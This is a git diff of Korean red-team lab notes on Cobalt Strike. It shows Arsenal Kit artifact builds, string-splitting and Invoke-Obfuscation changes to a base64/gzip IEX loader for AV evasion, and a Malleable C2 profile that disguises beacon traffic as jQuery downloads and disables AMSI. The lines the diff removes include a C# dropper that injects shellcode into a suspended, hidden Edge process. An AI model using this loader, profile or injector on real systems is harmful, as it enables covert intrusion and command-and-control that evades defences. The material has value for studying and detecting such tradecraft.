@@ -38,9 +38,10 @@ while(x--) {
 }
 
 ## Step 3. mailslot bypass template을 사용하여 artifact 제작
+### WSL Ubuntu에 접속
 ### ./build <techniques> <allocator> <stage size> <rdll size> <include resource file> <stack spoof> <syscalls> <output directory>
 attacker@DESKTOP-FGSTPS7:~$ cd /mnt/c/Tools/cobaltstrike/arsenal-kit/kits/artifact
-attacker@DESKTOP-FGSTPS7:/mnt/c/Tools/cobaltstrike/arsenal-kit/kits/artifact$ ./build.sh mailslot VirtualAlloc 344564 0 false false none /mnt/c/Tools/cobaltstrike/custom-artifacts
+attacker@DESKTOP-FGSTPS7:/mnt/c/Tools/cobaltstrike/arsenal-kit/kits/artifact$ ./build.sh mailslot VirtualAlloc 409600 0 false false none /mnt/c/Tools/cobaltstrike/custom-artifacts
 
 ## Step 4. Load artifact.cna
 
@@ -51,11 +52,12 @@ PS C:\Tools\ThreatCheck\ThreatCheck\bin\Debug> .\ThreatCheck.exe -f C:\Payloads\
 - Resource folder : C:\Tools\cobaltstrike\arsenal-kit\kits\resource
 ```
 ## Step 1. Build Resource kit
+### WSL Ubuntu에 접속
 attacker@DESKTOP-FGSTPS7:~$ cd /mnt/c/Tools/cobaltstrike/arsenal-kit/kits/resource
 attacker@DESKTOP-FGSTPS7:/mnt/c/Tools/cobaltstrike/arsenal-kit/kits/resource$ ./build.sh /mnt/c/Tools/cobaltstrike/custom-resources
 
 ## Step 2. template.x64.ps1의 5번째 줄 코드 수정
-`.Equals('System.dll')` → `.Equals('Sys'+'tem.dll')`
+.Equals('System.dll') → .Equals('Sys'+'tem.dll')
 
 ## Step 3. template.x64.ps1의 32번째 줄 코드 수정
 $var_wpm = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((func_get_proc_address kernel32.dll WriteProcessMemory), (func_get_delegate_type @([IntPtr], [IntPtr], [Byte[]], [UInt32], [IntPtr]) ([Bool])))
@@ -67,7 +69,6 @@ PS> ipmo C:\Tools\Invoke-Obfuscation\Invoke-Obfuscation.psd1
 PS> Invoke-Obfuscation
 Invoke-Obfuscation> SET SCRIPTBLOCK '$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String("%%DATA%%"));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();'
 Invoke-Obfuscation> TOKEN\ALL\1
-
 ### compress.ps1 예시
 SET-itEm  VarIABLe:WyizE ([tyPe]('conVE'+'Rt') ) ;  seT-variAbLe  0eXs  (  [tYpe]('iO.'+'COmp'+'Re'+'S'+'SiON.C'+'oM'+'P'+'ResSIonM'+'oDE')) ; ${s}=nEW-o`Bj`eCt IO.`MemO`Ry`St`REAM(, (VAriABle wYIze -val  )::"FR`omB`AsE64s`TriNG"("%%DATA%%"));i`EX (ne`w-`o`BJECT i`o.sTr`EAmRe`ADEr(NEw-`O`BJe`CT IO.CO`mPrESSi`oN.`gzI`pS`Tream(${s}, ( vAriable  0ExS).vALUE::"Dec`om`Press")))."RE`AdT`OEnd"();
 
@@ -88,11 +89,130 @@ PS C:\Tools\ThreatCheck\ThreatCheck\bin\Debug> .\ThreatCheck.exe -f C:\Payloads\
 PS> ssh attacker@10.0.0.5
 
 ## Step 2. Malleable C2 Profile 수정
+attacker@ubuntu:~$ vi /opt/cobaltstrike/profiles/default.profile
 set sample_name "Amy Profile";
 set sleeptime "2000";  # 2 Seconds
 set jitter    "30";
 set useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36";
 set host_stage "true"; 
+
+http-get {
+
+    set uri "/jquery-3.3.1.min.js";
+    set verb "GET";
+
+    client {
+
+        header "Accept" "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
+        #header "Host" "code.jquery.com";
+        header "Referer" "http://code.jquery.com/";
+        header "Accept-Encoding" "gzip, deflate";
+
+        metadata {
+            base64url;
+            prepend "__cfduid=";
+            header "Cookie";
+        }
+    }
+
+    server {
+
+        header "Server" "NetDNA-cache/2.2";
+        header "Cache-Control" "max-age=0, no-cache";
+        header "Pragma" "no-cache";
+        header "Connection" "keep-alive";
+        header "Content-Type" "application/javascript; charset=utf-8";
+
+        output {   
+            mask;
+            base64url;
+            ## The javascript was changed.  Double quotes and backslashes were escaped to properly render (Refer to Tips for Profile Parameter Values)
+            # 2nd Line            
+            prepend "!function(e,t){\"use strict\";\"object\"==typeof module&&\"object\"==typeof module.exports?module.exports=e.document?t(e,!0):function(e){if(!e.document)throw new Error(\"jQuery requires a window with a document\");return t(e)}:t(e)}(\"undefined\"!=typeof window?window:this,function(e,t){\"use strict\";var n=[],r=e.document,i=Object.getPrototypeOf,o=n.slice,a=n.concat,s=n.push,u=n.indexOf,l={},c=l.toString,f=l.hasOwnProperty,p=f.toString,d=p.call(Object),h={},g=function e(t){return\"function\"==typeof t&&\"number\"!=typeof t.nodeType},y=function e(t){return null!=t&&t===t.window},v={type:!0,src:!0,noModule:!0};function m(e,t,n){var i,o=(t=t||r).createElement(\"script\");if(o.text=e,n)for(i in v)n[i]&&(o[i]=n[i]);t.head.appendChild(o).parentNode.removeChild(o)}function x(e){return null==e?e+\"\":\"object\"==typeof e||\"function\"==typeof e?l[c.call(e)]||\"object\":typeof e}var b=\"3.3.1\",w=function(e,t){return new w.fn.init(e,t)},T=/^[\\s\\uFEFF\\xA0]+|[\\s\\uFEFF\\xA0]+$/g;w.fn=w.prototype={jquery:\"3.3.1\",constructor:w,length:0,toArray:function(){return o.call(this)},get:function(e){return null==e?o.call(this):e<0?this[e+this.length]:this[e]},pushStack:function(e){var t=w.merge(this.constructor(),e);return t.prevObject=this,t},each:function(e){return w.each(this,e)},map:function(e){return this.pushStack(w.map(this,function(t,n){return e.call(t,n,t)}))},slice:function(){return this.pushStack(o.apply(this,arguments))},first:function(){return this.eq(0)},last:function(){return this.eq(-1)},eq:function(e){var t=this.length,n=+e+(e<0?t:0);return this.pushStack(n>=0&&n<t?[this[n]]:[])},end:function(){return this.prevObject||this.constructor()},push:s,sort:n.sort,splice:n.splice},w.extend=w.fn.extend=function(){var e,t,n,r,i,o,a=arguments[0]||{},s=1,u=arguments.length,l=!1;for(\"boolean\"==typeof a&&(l=a,a=arguments[s]||{},s++),\"object\"==typeof a||g(a)||(a={}),s===u&&(a=this,s--);s<u;s++)if(null!=(e=arguments[s]))for(t in e)n=a[t],a!==(r=e[t])&&(l&&r&&(w.isPlainObject(r)||(i=Array.isArray(r)))?(i?(i=!1,o=n&&Array.isArray(n)?n:[]):o=n&&w.isPlainObject(n)?n:{},a[t]=w.extend(l,o,r)):void 0!==r&&(a[t]=r));return a},w.extend({expando:\"jQuery\"+(\"3.3.1\"+Math.random()).replace(/\\D/g,\"\"),isReady:!0,error:function(e){throw new Error(e)},noop:function(){},isPlainObject:function(e){var t,n;return!(!e||\"[object Object]\"!==c.call(e))&&(!(t=i(e))||\"function\"==typeof(n=f.call(t,\"constructor\")&&t.constructor)&&p.call(n)===d)},isEmptyObject:function(e){var t;for(t in e)return!1;return!0},globalEval:function(e){m(e)},each:function(e,t){var n,r=0;if(C(e)){for(n=e.length;r<n;r++)if(!1===t.call(e[r],r,e[r]))break}else for(r in e)if(!1===t.call(e[r],r,e[r]))break;return e},trim:function(e){return null==e?\"\":(e+\"\").replace(T,\"\")},makeArray:function(e,t){var n=t||[];return null!=e&&(C(Object(e))?w.merge(n,\"string\"==typeof e?[e]:e):s.call(n,e)),n},inArray:function(e,t,n){return null==t?-1:u.call(t,e,n)},merge:function(e,t){for(var n=+t.length,r=0,i=e.length;r<n;r++)e[i++]=t[r];return e.length=i,e},grep:function(e,t,n){for(var r,i=[],o=0,a=e.length,s=!n;o<a;o++)(r=!t(e[o],o))!==s&&i.push(e[o]);return i},map:function(e,t,n){var r,i,o=0,s=[];if(C(e))for(r=e.length;o<r;o++)null!=(i=t(e[o],o,n))&&s.push(i);else for(o in e)null!=(i=t(e[o],o,n))&&s.push(i);return a.apply([],s)},guid:1,support:h}),\"function\"==typeof Symbol&&(w.fn[Symbol.iterator]=n[Symbol.iterator]),w.each(\"Boolean Number String Function Array Date RegExp Object Error Symbol\".split(\" \"),function(e,t){l[\"[object \"+t+\"]\"]=t.toLowerCase()});function C(e){var t=!!e&&\"length\"in e&&e.length,n=x(e);return!g(e)&&!y(e)&&(\"array\"===n||0===t||\"number\"==typeof t&&t>0&&t-1 in e)}var E=function(e){var t,n,r,i,o,a,s,u,l,c,f,p,d,h,g,y,v,m,x,b=\"sizzle\"+1*new Date,w=e.document,T=0,C=0,E=ae(),k=ae(),S=ae(),D=function(e,t){return e===t&&(f=!0),0},N={}.hasOwnProperty,A=[],j=A.pop,q=A.push,L=A.push,H=A.slice,O=function(e,t){for(var n=0,r=e.length;n<r;n++)if(e[n]===t)return n;return-1},P=\"\r";
+            # 1st Line
+            prepend "/*! jQuery v3.3.1 | (c) JS Foundation and other contributors | jquery.org/license */";
+            append "\".(o=t.documentElement,Math.max(t.body[\"scroll\"+e],o[\"scroll\"+e],t.body[\"offset\"+e],o[\"offset\"+e],o[\"client\"+e])):void 0===i?w.css(t,n,s):w.style(t,n,i,s)},t,a?i:void 0,a)}})}),w.each(\"blur focus focusin focusout resize scroll click dblclick mousedown mouseup mousemove mouseover mouseout mouseenter mouseleave change select submit keydown keypress keyup contextmenu\".split(\" \"),function(e,t){w.fn[t]=function(e,n){return arguments.length>0?this.on(t,null,e,n):this.trigger(t)}}),w.fn.extend({hover:function(e,t){return this.mouseenter(e).mouseleave(t||e)}}),w.fn.extend({bind:function(e,t,n){return this.on(e,null,t,n)},unbind:function(e,t){return this.off(e,null,t)},delegate:function(e,t,n,r){return this.on(t,e,n,r)},undelegate:function(e,t,n){return 1===arguments.length?this.off(e,\"**\"):this.off(t,e||\"**\",n)}}),w.proxy=function(e,t){var n,r,i;if(\"string\"==typeof t&&(n=e[t],t=e,e=n),g(e))return r=o.call(arguments,2),i=function(){return e.apply(t||this,r.concat(o.call(arguments)))},i.guid=e.guid=e.guid||w.guid++,i},w.holdReady=function(e){e?w.readyWait++:w.ready(!0)},w.isArray=Array.isArray,w.parseJSON=JSON.parse,w.nodeName=N,w.isFunction=g,w.isWindow=y,w.camelCase=G,w.type=x,w.now=Date.now,w.isNumeric=function(e){var t=w.type(e);return(\"number\"===t||\"string\"===t)&&!isNaN(e-parseFloat(e))},\"function\"==typeof define&&define.amd&&define(\"jquery\",[],function(){return w});var Jt=e.jQuery,Kt=e.$;return w.noConflict=function(t){return e.$===w&&(e.$=Kt),t&&e.jQuery===w&&(e.jQuery=Jt),w},t||(e.jQuery=e.$=w),w});";
+            print;
+        }
+    }
+}
+
+http-post {
+
+    set uri "/jquery-3.3.2.min.js";
+    set verb "POST";
+
+    client {
+
+        header "Accept" "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
+        #header "Host" "code.jquery.com";
+	        header "Referer" "http://code.jquery.com/";
+	        header "Accept-Encoding" "gzip, deflate";
+	       
+	        id {
+	            mask;       
+	            base64url;
+	            parameter "__cfduid";            
+	        }
+	              
+	        output {
+	            mask;
+	            base64url;
+	            print;
+	        }
+	}
+
+	server {
+
+		header "Server" "NetDNA-cache/2.2";
+		header "Cache-Control" "max-age=0, no-cache";
+		header "Pragma" "no-cache";
+		header "Connection" "keep-alive";
+		header "Content-Type" "application/javascript; charset=utf-8";
+
+		output {
+			mask;
+			base64url;
+			## The javascript was changed.  Double quotes and backslashes were escaped to properly render (Refer to Tips for Profile Parameter Values)
+			# 2nd Line            
+			prepend "!function(e,t){\"use strict\";\"object\"==typeof module&&\"object\"==typeof module.exports?module.exports=e.document?t(e,!0):function(e){if(!e.document)throw new Error(\"jQuery requires a window with a document\");return t(e)}:t(e)}(\"undefined\"!=typeof window?window:this,function(e,t){\"use strict\";var n=[],r=e.document,i=Object.getPrototypeOf,o=n.slice,a=n.concat,s=n.push,u=n.indexOf,l={},c=l.toString,f=l.hasOwnProperty,p=f.toString,d=p.call(Object),h={},g=function e(t){return\"function\"==typeof t&&\"number\"!=typeof t.nodeType},y=function e(t){return null!=t&&t===t.window},v={type:!0,src:!0,noModule:!0};function m(e,t,n){var i,o=(t=t||r).createElement(\"script\");if(o.text=e,n)for(i in v)n[i]&&(o[i]=n[i]);t.head.appendChild(o).parentNode.removeChild(o)}function x(e){return null==e?e+\"\":\"object\"==typeof e||\"function\"==typeof e?l[c.call(e)]||\"object\":typeof e}var b=\"3.3.1\",w=function(e,t){return new w.fn.init(e,t)},T=/^[\\s\\uFEFF\\xA0]+|[\\s\\uFEFF\\xA0]+$/g;w.fn=w.prototype={jquery:\"3.3.1\",constructor:w,length:0,toArray:function(){return o.call(this)},get:function(e){return null==e?o.call(this):e<0?this[e+this.length]:this[e]},pushStack:function(e){var t=w.merge(this.constructor(),e);return t.prevObject=this,t},each:function(e){return w.each(this,e)},map:function(e){return this.pushStack(w.map(this,function(t,n){return e.call(t,n,t)}))},slice:function(){return this.pushStack(o.apply(this,arguments))},first:function(){return this.eq(0)},last:function(){return this.eq(-1)},eq:function(e){var t=this.length,n=+e+(e<0?t:0);return this.pushStack(n>=0&&n<t?[this[n]]:[])},end:function(){return this.prevObject||this.constructor()},push:s,sort:n.sort,splice:n.splice},w.extend=w.fn.extend=function(){var e,t,n,r,i,o,a=arguments[0]||{},s=1,u=arguments.length,l=!1;for(\"boolean\"==typeof a&&(l=a,a=arguments[s]||{},s++),\"object\"==typeof a||g(a)||(a={}),s===u&&(a=this,s--);s<u;s++)if(null!=(e=arguments[s]))for(t in e)n=a[t],a!==(r=e[t])&&(l&&r&&(w.isPlainObject(r)||(i=Array.isArray(r)))?(i?(i=!1,o=n&&Array.isArray(n)?n:[]):o=n&&w.isPlainObject(n)?n:{},a[t]=w.extend(l,o,r)):void 0!==r&&(a[t]=r));return a},w.extend({expando:\"jQuery\"+(\"3.3.1\"+Math.random()).replace(/\\D/g,\"\"),isReady:!0,error:function(e){throw new Error(e)},noop:function(){},isPlainObject:function(e){var t,n;return!(!e||\"[object Object]\"!==c.call(e))&&(!(t=i(e))||\"function\"==typeof(n=f.call(t,\"constructor\")&&t.constructor)&&p.call(n)===d)},isEmptyObject:function(e){var t;for(t in e)return!1;return!0},globalEval:function(e){m(e)},each:function(e,t){var n,r=0;if(C(e)){for(n=e.length;r<n;r++)if(!1===t.call(e[r],r,e[r]))break}else for(r in e)if(!1===t.call(e[r],r,e[r]))break;return e},trim:function(e){return null==e?\"\":(e+\"\").replace(T,\"\")},makeArray:function(e,t){var n=t||[];return null!=e&&(C(Object(e))?w.merge(n,\"string\"==typeof e?[e]:e):s.call(n,e)),n},inArray:function(e,t,n){return null==t?-1:u.call(t,e,n)},merge:function(e,t){for(var n=+t.length,r=0,i=e.length;r<n;r++)e[i++]=t[r];return e.length=i,e},grep:function(e,t,n){for(var r,i=[],o=0,a=e.length,s=!n;o<a;o++)(r=!t(e[o],o))!==s&&i.push(e[o]);return i},map:function(e,t,n){var r,i,o=0,s=[];if(C(e))for(r=e.length;o<r;o++)null!=(i=t(e[o],o,n))&&s.push(i);else for(o in e)null!=(i=t(e[o],o,n))&&s.push(i);return a.apply([],s)},guid:1,support:h}),\"function\"==typeof Symbol&&(w.fn[Symbol.iterator]=n[Symbol.iterator]),w.each(\"Boolean Number String Function Array Date RegExp Object Error Symbol\".split(\" \"),function(e,t){l[\"[object \"+t+\"]\"]=t.toLowerCase()});function C(e){var t=!!e&&\"length\"in e&&e.length,n=x(e);return!g(e)&&!y(e)&&(\"array\"===n||0===t||\"number\"==typeof t&&t>0&&t-1 in e)}var E=function(e){var t,n,r,i,o,a,s,u,l,c,f,p,d,h,g,y,v,m,x,b=\"sizzle\"+1*new Date,w=e.document,T=0,C=0,E=ae(),k=ae(),S=ae(),D=function(e,t){return e===t&&(f=!0),0},N={}.hasOwnProperty,A=[],j=A.pop,q=A.push,L=A.push,H=A.slice,O=function(e,t){for(var n=0,r=e.length;n<r;n++)if(e[n]===t)return n;return-1},P=\"\r";
+			# 1st Line
+			prepend "/*! jQuery v3.3.1 | (c) JS Foundation and other contributors | jquery.org/license */";
+			append "\".(o=t.documentElement,Math.max(t.body[\"scroll\"+e],o[\"scroll\"+e],t.body[\"offset\"+e],o[\"offset\"+e],o[\"client\"+e])):void 0===i?w.css(t,n,s):w.style(t,n,i,s)},t,a?i:void 0,a)}})}),w.each(\"blur focus focusin focusout resize scroll click dblclick mousedown mouseup mousemove mouseover mouseout mouseenter mouseleave change select submit keydown keypress keyup contextmenu\".split(\" \"),function(e,t){w.fn[t]=function(e,n){return arguments.length>0?this.on(t,null,e,n):this.trigger(t)}}),w.fn.extend({hover:function(e,t){return this.mouseenter(e).mouseleave(t||e)}}),w.fn.extend({bind:function(e,t,n){return this.on(e,null,t,n)},unbind:function(e,t){return this.off(e,null,t)},delegate:function(e,t,n,r){return this.on(t,e,n,r)},undelegate:function(e,t,n){return 1===arguments.length?this.off(e,\"**\"):this.off(t,e||\"**\",n)}}),w.proxy=function(e,t){var n,r,i;if(\"string\"==typeof t&&(n=e[t],t=e,e=n),g(e))return r=o.call(arguments,2),i=function(){return e.apply(t||this,r.concat(o.call(arguments)))},i.guid=e.guid=e.guid||w.guid++,i},w.holdReady=function(e){e?w.readyWait++:w.ready(!0)},w.isArray=Array.isArray,w.parseJSON=JSON.parse,w.nodeName=N,w.isFunction=g,w.isWindow=y,w.camelCase=G,w.type=x,w.now=Date.now,w.isNumeric=function(e){var t=w.type(e);return(\"number\"===t||\"string\"===t)&&!isNaN(e-parseFloat(e))},\"function\"==typeof define&&define.amd&&define(\"jquery\",[],function(){return w});var Jt=e.jQuery,Kt=e.$;return w.noConflict=function(t){return e.$===w&&(e.$=Kt),t&&e.jQuery===w&&(e.jQuery=Jt),w},t||(e.jQuery=e.$=w),w});";
+			print;
+		}
+	}
+}
+
+http-stager {  
+	set uri_x86 "/jquery-3.3.1.slim.min.js";
+	set uri_x64 "/jquery-3.3.2.slim.min.js";
+
+	server {
+		header "Server" "NetDNA-cache/2.2";
+		header "Cache-Control" "max-age=0, no-cache";
+		header "Pragma" "no-cache";
+		header "Connection" "keep-alive";
+		header "Content-Type" "application/javascript; charset=utf-8";
+		output {
+			## The javascript was changed.  Double quotes and backslashes were escaped to properly render (Refer to Tips for Profile Parameter Values)
+			# 2nd Line            
+			prepend "!function(e,t){\"use strict\";\"object\"==typeof module&&\"object\"==typeof module.exports?module.exports=e.document?t(e,!0):function(e){if(!e.document)throw new Error(\"jQuery requires a window with a document\");return t(e)}:t(e)}(\"undefined\"!=typeof window?window:this,function(e,t){\"use strict\";var n=[],r=e.document,i=Object.getPrototypeOf,o=n.slice,a=n.concat,s=n.push,u=n.indexOf,l={},c=l.toString,f=l.hasOwnProperty,p=f.toString,d=p.call(Object),h={},g=function e(t){return\"function\"==typeof t&&\"number\"!=typeof t.nodeType},y=function e(t){return null!=t&&t===t.window},v={type:!0,src:!0,noModule:!0};function m(e,t,n){var i,o=(t=t||r).createElement(\"script\");if(o.text=e,n)for(i in v)n[i]&&(o[i]=n[i]);t.head.appendChild(o).parentNode.removeChild(o)}function x(e){return null==e?e+\"\":\"object\"==typeof e||\"function\"==typeof e?l[c.call(e)]||\"object\":typeof e}var b=\"3.3.1\",w=function(e,t){return new w.fn.init(e,t)},T=/^[\\s\\uFEFF\\xA0]+|[\\s\\uFEFF\\xA0]+$/g;w.fn=w.prototype={jquery:\"3.3.1\",constructor:w,length:0,toArray:function(){return o.call(this)},get:function(e){return null==e?o.call(this):e<0?this[e+this.length]:this[e]},pushStack:function(e){var t=w.merge(this.constructor(),e);return t.prevObject=this,t},each:function(e){return w.each(this,e)},map:function(e){return this.pushStack(w.map(this,function(t,n){return e.call(t,n,t)}))},slice:function(){return this.pushStack(o.apply(this,arguments))},first:function(){return this.eq(0)},last:function(){return this.eq(-1)},eq:function(e){var t=this.length,n=+e+(e<0?t:0);return this.pushStack(n>=0&&n<t?[this[n]]:[])},end:function(){return this.prevObject||this.constructor()},push:s,sort:n.sort,splice:n.splice},w.extend=w.fn.extend=function(){var e,t,n,r,i,o,a=arguments[0]||{},s=1,u=arguments.length,l=!1;for(\"boolean\"==typeof a&&(l=a,a=arguments[s]||{},s++),\"object\"==typeof a||g(a)||(a={}),s===u&&(a=this,s--);s<u;s++)if(null!=(e=arguments[s]))for(t in e)n=a[t],a!==(r=e[t])&&(l&&r&&(w.isPlainObject(r)||(i=Array.isArray(r)))?(i?(i=!1,o=n&&Array.isArray(n)?n:[]):o=n&&w.isPlainObject(n)?n:{},a[t]=w.extend(l,o,r)):void 0!==r&&(a[t]=r));return a},w.extend({expando:\"jQuery\"+(\"3.3.1\"+Math.random()).replace(/\\D/g,\"\"),isReady:!0,error:function(e){throw new Error(e)},noop:function(){},isPlainObject:function(e){var t,n;return!(!e||\"[object Object]\"!==c.call(e))&&(!(t=i(e))||\"function\"==typeof(n=f.call(t,\"constructor\")&&t.constructor)&&p.call(n)===d)},isEmptyObject:function(e){var t;for(t in e)return!1;return!0},globalEval:function(e){m(e)},each:function(e,t){var n,r=0;if(C(e)){for(n=e.length;r<n;r++)if(!1===t.call(e[r],r,e[r]))break}else for(r in e)if(!1===t.call(e[r],r,e[r]))break;return e},trim:function(e){return null==e?\"\":(e+\"\").replace(T,\"\")},makeArray:function(e,t){var n=t||[];return null!=e&&(C(Object(e))?w.merge(n,\"string\"==typeof e?[e]:e):s.call(n,e)),n},inArray:function(e,t,n){return null==t?-1:u.call(t,e,n)},merge:function(e,t){for(var n=+t.length,r=0,i=e.length;r<n;r++)e[i++]=t[r];return e.length=i,e},grep:function(e,t,n){for(var r,i=[],o=0,a=e.length,s=!n;o<a;o++)(r=!t(e[o],o))!==s&&i.push(e[o]);return i},map:function(e,t,n){var r,i,o=0,s=[];if(C(e))for(r=e.length;o<r;o++)null!=(i=t(e[o],o,n))&&s.push(i);else for(o in e)null!=(i=t(e[o],o,n))&&s.push(i);return a.apply([],s)},guid:1,support:h}),\"function\"==typeof Symbol&&(w.fn[Symbol.iterator]=n[Symbol.iterator]),w.each(\"Boolean Number String Function Array Date RegExp Object Error Symbol\".split(\" \"),function(e,t){l[\"[object \"+t+\"]\"]=t.toLowerCase()});function C(e){var t=!!e&&\"length\"in e&&e.length,n=x(e);return!g(e)&&!y(e)&&(\"array\"===n||0===t||\"number\"==typeof t&&t>0&&t-1 in e)}var E=function(e){var t,n,r,i,o,a,s,u,l,c,f,p,d,h,g,y,v,m,x,b=\"sizzle\"+1*new Date,w=e.document,T=0,C=0,E=ae(),k=ae(),S=ae(),D=function(e,t){return e===t&&(f=!0),0},N={}.hasOwnProperty,A=[],j=A.pop,q=A.push,L=A.push,H=A.slice,O=function(e,t){for(var n=0,r=e.length;n<r;n++)if(e[n]===t)return n;return-1},P=\"\r";
+			# 1st Line
+			prepend "/*! jQuery v3.3.1 | (c) JS Foundation and other contributors | jquery.org/license */";
+			append "\".(o=t.documentElement,Math.max(t.body[\"scroll\"+e],o[\"scroll\"+e],t.body[\"offset\"+e],o[\"offset\"+e],o[\"client\"+e])):void 0===i?w.css(t,n,s):w.style(t,n,i,s)},t,a?i:void 0,a)}})}),w.each(\"blur focus focusin focusout resize scroll click dblclick mousedown mouseup mousemove mouseover mouseout mouseenter mouseleave change select submit keydown keypress keyup contextmenu\".split(\" \"),function(e,t){w.fn[t]=function(e,n){return arguments.length>0?this.on(t,null,e,n):this.trigger(t)}}),w.fn.extend({hover:function(e,t){return this.mouseenter(e).mouseleave(t||e)}}),w.fn.extend({bind:function(e,t,n){return this.on(e,null,t,n)},unbind:function(e,t){return this.off(e,null,t)},delegate:function(e,t,n,r){return this.on(t,e,n,r)},undelegate:function(e,t,n){return 1===arguments.length?this.off(e,\"**\"):this.off(t,e||\"**\",n)}}),w.proxy=function(e,t){var n,r,i;if(\"string\"==typeof t&&(n=e[t],t=e,e=n),g(e))return r=o.call(arguments,2),i=function(){return e.apply(t||this,r.concat(o.call(arguments)))},i.guid=e.guid=e.guid||w.guid++,i},w.holdReady=function(e){e?w.readyWait++:w.ready(!0)},w.isArray=Array.isArray,w.parseJSON=JSON.parse,w.nodeName=N,w.isFunction=g,w.isWindow=y,w.camelCase=G,w.type=x,w.now=Date.now,w.isNumeric=function(e){var t=w.type(e);return(\"number\"===t||\"string\"===t)&&!isNaN(e-parseFloat(e))},\"function\"==typeof define&&define.amd&&define(\"jquery\",[],function(){return w});var Jt=e.jQuery,Kt=e.$;return w.noConflict=function(t){return e.$===w&&(e.$=Kt),t&&e.jQuery===w&&(e.jQuery=Jt),w},t||(e.jQuery=e.$=w),w});";
+			print;
+		}
+	}
+
+	client {
+		header "Accept" "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
+		header "Accept-Language" "en-US,en;q=0.5";
+		#header "Host" "code.jquery.com";
+		header "Referer" "http://code.jquery.com/";
+		header "Accept-Encoding" "gzip, deflate";
+	}
+}
 
 stage {
 	set userwx "false"; 
@@ -101,7 +221,7 @@ stage {
 }
 
 post-ex {
-	set pipename "Winsock2\\CatalogChangeListener-###-0,";
+	set pipename "dotnet-diagnostic-47123";
 	set amsi_disable "true";
 	set spawnto_x64 "%windir%\\sysnative\\dllhost.exe";
 	set spawnto_x86 "%windir%\\syswow64\\dllhost.exe";
@@ -148,267 +268,6 @@ beacon> powerpick Start-Sleep -s 60
 ```
 
 ## Initial Access - Bypass AppLocker
-### 악성 DLL 제작
-```
-using System;
-using System.IO;
-using System.Reflection;
-using System.Runtime.InteropServices;
-  
-namespace amy
-{
-    public class Dropper
-    {
-        public Dropper()
-        {
-            var si = new STARTUPINFOA
-            {
-                cb = (uint)Marshal.SizeOf<STARTUPINFOA>(),
-                dwFlags = STARTUPINFO_FLAGS.STARTF_USESHOWWINDOW
-            };
-  
-            // create hidden + suspended msedge process
-            var success = CreateProcessA(
-                "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe",
-                "\"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe\" --no-startup-window",
-                IntPtr.Zero,
-                IntPtr.Zero,
-                false,
-                PROCESS_CREATION_FLAGS.CREATE_NO_WINDOW | PROCESS_CREATION_FLAGS.CREATE_SUSPENDED,
-                IntPtr.Zero,
-                "C:\Program Files (x86)\Microsoft\Edge\Application\",
-                ref si,
-                out var pi);
-  
-            if (!success)
-                return;
-  
-            // get basic process information
-            var szPbi = Marshal.SizeOf<PROCESS_BASIC_INFORMATION>();
-            var lpPbi = Marshal.AllocHGlobal(szPbi);
-  
-            NtQueryInformationProcess(
-                pi.hProcess,
-                PROCESSINFOCLASS.ProcessBasicInformation,
-                lpPbi,
-                (uint)szPbi,
-                out _);
-  
-            // marshal data to structure
-            var pbi = Marshal.PtrToStructure<PROCESS_BASIC_INFORMATION>(lpPbi);
-            Marshal.FreeHGlobal(lpPbi);
-  
-            // calculate pointer to image base address
-            var lpImageBaseAddress = pbi.PebBaseAddress + 0x10;
-  
-            // buffer to hold data, 64-bit addresses are 8 bytes
-            var bImageBaseAddress = new byte[8];
-  
-            // read data from spawned process
-            ReadProcessMemory(
-                pi.hProcess,
-                lpImageBaseAddress,
-                bImageBaseAddress,
-                8,
-                out _);
-  
-            // convert address bytes to pointer
-            var baseAddress = (IntPtr)BitConverter.ToInt64(bImageBaseAddress, 0);
-  
-            // read pe headers
-            var data = new byte[512];
-  
-            ReadProcessMemory(
-                pi.hProcess,
-                baseAddress,
-                data,
-                512,
-                out _);
-  
-            // read e_lfanew
-            var e_lfanew = BitConverter.ToInt32(data, 0x3C);
-  
-            // calculate rva
-            var rvaOffset = e_lfanew + 0x28;
-            var rva = BitConverter.ToUInt32(data, rvaOffset);
-  
-            // calculate address of entry point
-            var lpEntryPoint = (IntPtr)((UInt64)baseAddress + rva);
-  
-            // read the shellcode
-            byte[] shellcode;
-  
-            var assembly = Assembly.GetExecutingAssembly();
-  
-            using (var rs = assembly.GetManifestResourceStream("amy.http_x64.xprocess.bin"))
-            {
-                // convert stream to raw byte[]
-                using (var ms = new MemoryStream())
-                {
-                    rs.CopyTo(ms);
-                    shellcode = ms.ToArray();
-                }
-            }
-  
-            // copy shellcode into address of entry point
-            WriteProcessMemory(
-                pi.hProcess,
-                lpEntryPoint,
-                shellcode,
-                shellcode.Length,
-                out _);
-  
-            // resume process
-            ResumeThread(pi.hThread);
-        }
-  
-        [DllImport("KERNEL32.dll", ExactSpelling = true, SetLastError = true, CharSet = CharSet.Ansi)]
-        [DefaultDllImportSearchPaths(DllImportSearchPath.System32)]
-        public static extern bool CreateProcessA(
-            string lpApplicationName,
-            string lpCommandLine,
-            IntPtr lpProcessAttributes,
-            IntPtr lpThreadAttributes,
-            bool bInheritHandles,
-            PROCESS_CREATION_FLAGS dwCreationFlags,
-            IntPtr lpEnvironment,
-            string lpCurrentDirectory,
-            ref STARTUPINFOA lpStartupInfo,
-            out PROCESS_INFORMATION lpProcessInformation);
-  
-        [DllImport("ntdll.dll", ExactSpelling = true)]
-        [DefaultDllImportSearchPaths(DllImportSearchPath.System32)]
-        public static extern uint NtQueryInformationProcess(
-            IntPtr processHandle,
-            PROCESSINFOCLASS processInformationClass,
-            IntPtr processInformation,
-            uint processInformationLength,
-            out uint returnLength);
-  
-        [DllImport("KERNEL32.dll", ExactSpelling = true, SetLastError = true)]
-        [DefaultDllImportSearchPaths(DllImportSearchPath.System32)]
-        public static extern bool ReadProcessMemory(
-            IntPtr hProcess,
-            IntPtr lpBaseAddress,
-            byte[] lpBuffer,
-            UInt64 nSize,
-            out uint lpNumberOfBytesRead);
-  
-        [DllImport("KERNEL32.dll", ExactSpelling = true, SetLastError = true)]
